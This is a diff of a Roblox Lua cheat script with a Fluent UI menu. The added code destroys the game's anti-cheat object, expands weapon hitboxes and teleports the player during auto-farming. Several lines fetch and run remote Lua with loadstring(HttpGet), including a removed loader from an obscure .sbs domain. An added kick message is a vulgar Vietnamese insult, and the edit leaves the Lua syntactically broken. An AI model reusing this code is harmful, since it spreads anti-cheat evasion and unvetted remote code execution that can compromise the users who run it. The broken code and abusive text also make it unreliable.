@@ -1,27 +1,30 @@
-loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
-local allowedUsers = {
-    ["b123vnoo"] = true,
-    ["phubentau"] = true,
-    ["anhtthuc03"] = true,
-    ["ArvinSenpai1"] = true,
-    ["YumiSenseii"] = true,
-    ["hoangbautroi11"] = true,
-    ["foxgoodboy123"] = true,
-    ["emfankia123"] = true,
-    ["seven09812"] = true,
-
-}
+local allowedUsers = loadstring(game:HttpGet("https://raw.githubusercontent.com/skidconmemay1ytikx/Cuduyto100m/refs/heads/main/Cuduydai100m"))()
 local currentUserName = game.Players.LocalPlayer.Name
-
 if not allowedUsers[currentUserName] then
-    game.StarterGui:SetCore("SendNotification", {
-        Title = "?";
-        Text = "Bạn không có quyền sử dụng script này.";
-        Duration = 5;
-    })
-    return
-end
+player:Kick("địt mẹ bú liếm con cặc t địt cả lò nhà mày mẹ mày là con phò Quỳ Xuống")
 print('VN SCRIPT LOADED!')
+
+Game:GetService("RunService").Heartbeat:Connect(function()
+    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+        local humanoid = game.Players.LocalPlayer.Character.Humanoid
+        if humanoid:GetState() == Enum.HumanoidStateType.Freefall then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, -0.01, 0)
+        end
+    end
+end)
+
+repeat wait() until game:IsLoaded()
+local player = game:GetService("Players").LocalPlayer
+local playerScripts = player:FindFirstChild("PlayerScripts")
+
+if playerScripts then
+    local donoBoard = playerScripts:FindFirstChild("DonoBoard")
+    if donoBoard then
+        donoBoard:Destroy()
+        warn("Anti cheat hai vc")
+    end
+end
+
 if workspace:FindFirstChild("Antifly") then
     for i,v in pairs(workspace.Antifly:GetChildren()) do
        if v:FindFirstChild('TouchInterest') or v:FindFirstChildOfClass("TouchTransmitter") then
@@ -46,8 +49,8 @@ local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/d
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
 
 local Window = Fluent:CreateWindow({
-    Title = "Hack" .. Fluent.Version,
-    SubTitle = "[ 1.0 ]",
+    Title = "Cộng Đồng Việt Nam",
+    SubTitle = "By Reiji | Ẩn Danh", 
     TabWidth = 160,
     Size = UDim2.fromOffset(580, 460),
     Acrylic = true,
@@ -119,6 +122,7 @@ Toggle:OnChanged(function(Value)
     AutoBuyBangGac = Value
 end)
 
+
 Tabs.Main:AddButton({
     Title = "Hit Box",
     Description = "",
@@ -144,7 +148,7 @@ Tabs.Main:AddButton({
                             v.Handle.Massless = true
                             v.Handle.Transparency = 1
                             a.Adornee = v.Handle
-                            v.Handle.Size = Vector3.new(15, 25 , 2)
+                            v.Handle.Size = Vector3.new(25,25,25)
                             local selectionBox = Instance.new("SelectionBox",v.Handle)
                             selectionBox.Adornee = v.Handle
                             selectionBox.Color3 = Color3.new(0, 0.313725, 0.47451)
@@ -168,7 +172,7 @@ Tabs.Main:AddButton({
                     })
                     for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren()) do
                         if v:isA("Tool") then
-                            v.Handle.Size = Vector3.new(15, 30 , 2)
+                            v.Handle.Size = Vector3.new(25,25,25)
                         end
                     end
                 end
@@ -295,14 +299,14 @@ spawn(function()
                     for iline,npc in pairs(workspace.GiangHo.Drop:GetChildren()) do
                         local npcstatus = npc.values.Chasing.Value
                         if npcstatus == false then
-                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame * CFrame.new(0,0,5)
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame * CFrame.new(0,9,0)
                             wait(.1)
-                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame * CFrame.new(0,0,5)
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame * CFrame.new(0,9,0)
                         else
                             npc.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame
                         end
                     end
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,0,5)
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,9,0)
                     if not game.Players.LocalPlayer.Backpack:FindFirstChild(AttackWeapon) and not game.Players.LocalPlayer.Character:FindFirstChild(AttackWeapon) then
                         UnInventoryWeapon(AttackWeapon)
                         wait(1)
@@ -359,14 +363,14 @@ spawn(function()
                     for iline,npc in pairs(workspace.GiangHo2.Drop:GetChildren()) do
                         local npcstatus = npc.values.Chasing.Value
                         if npcstatus == false then
-                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame * CFrame.new(0,0,5)
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame * CFrame.new(0,15,0)
                             wait(.1)
-                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame * CFrame.new(0,0,5)
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame * CFrame.new(0,15,0)
                         else
                             npc.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame
                         end
                     end
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,0,5)
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,15,0)
                     if not game.Players.LocalPlayer.Backpack:FindFirstChild(AttackWeapon) and not game.Players.LocalPlayer.Character:FindFirstChild(AttackWeapon) then
                         UnInventoryWeapon(AttackWeapon)
                         wait(1)
@@ -429,5 +433,7 @@ function BuyMatau()
     game:GetService("ReplicatedStorage").KnitPackages._Index["sleitnick_knit@1.7.0"].knit.Services.ShopService.RE.buyItem:FireServer("MaTau")
     wait(1)
 end
+
+print('cdvn rác')
 
 print('VN SCRIPT PASS')
